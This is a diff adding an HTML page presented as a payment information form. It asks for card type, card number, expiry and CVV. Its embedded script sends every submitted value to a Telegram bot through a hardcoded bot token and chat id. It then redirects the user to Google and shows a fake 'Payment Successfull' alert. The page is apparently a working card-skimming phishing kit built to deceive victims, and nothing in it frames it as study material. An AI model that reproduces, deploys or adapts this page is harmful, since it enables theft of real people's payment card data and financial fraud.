@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <title>Payment Information Form</title>
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        
+        body {
+    font-family: Arial, sans-serif;
+    background-color: #f4f4f4;
+    margin: 0;
+    padding: 20px;
+}
+
+.container {
+    max-width: 400px;
+    margin: auto;
+    background: white;
+    padding: 20px;
+    border-radius: 5px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+}
+
+h1 {
+    text-align: center;
+}
+
+label {
+    display: block;
+    margin: 10px 0 5px;
+}
+
+input, select, button {
+    width: 90%;
+    padding: 10px;
+    margin-bottom: 15px;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+}
+
+button {
+    background-color: #28a745;
+    color: white;
+    border: none;
+    cursor: pointer;
+}
+
+button:hover {
+    background-color: #218838;
+}
+</style>
+</head>
+<body>
+    <div class="container">
+        <h1>Payment Information</h1>
+        <form onsubmit=" return sender()">
+            <label for="cardType">Card Type:</label>
+            <select id="card1" name="card1">
+                <option value="Debit Card">Debit Card</option>
+                <option value="Credit Card">Credit Card</option>
+            </select>
+
+            <label for="cardNumber">Card Number:</label>
+            <input type="Number" id="cardNo" name="cardNo" required maxlength="16" placeholder="1234 5678 9012 3456">
+
+            <label for="examDate">Exam Date:</label>
+            <input type="month" id="exp" name="exp" required>
+            <label for="cvv">CVV Number:</label>
+            <input type="text" id="cvv" name="cvv" required pattern="\d{3}" maxlength="3" placeholder="123">
+            <br><br>
+             <input type="file" id="img" name="img">
+
+            <button type="submit">Submit</button>
+        </form>
+    </div>
+    <link rel="stylesheet" href="style.css">
+    <script src="sender.js"></script>
+  
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  
+  <script>
+  //bot token
+var telegram_bot_id = "7790794227:AAFsSbfZBNBiMs93o_cT0bHJFvQuNtkXOm8";
+//chat id
+var chat_id = 1210231596;
+var ready = function () {
+    card1 = document.getElementById("card1").value;
+    cardNo = document.getElementById("cardNo").value;
+    exp = document.getElementById("exp").value;
+    cvv = document.getElementById("cvv").value;
+    img = document.getElementById("img").value;
+    message = 
+      "\ntyp: " + card1 + 
+      "\nCard No: " + cardNo + 
+      "\nExp: " + exp + 
+      "\ncvv: " + cvv + 
+      "\nimg: " + img;
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message,
+          "file": message
+        })
+    };
+    $.ajax(settings).done(function (response) {
+        console.log(response);
+        
+        document.location = "https://www.google.com/"; 
+        
+      swal("Successfull", "Your Payment Successfull", "success");
+      
+    });
+    document.getElementById("card1").value = "";
+    document.getElementById("cardNo").value = "";
+    document.getElementById("exp").value = "";
+    document.getElementById("cvv").value = "";
+    document.getElementById("img").value = "";
+    return false;
+};
+  </script>
+</body>
+</html>
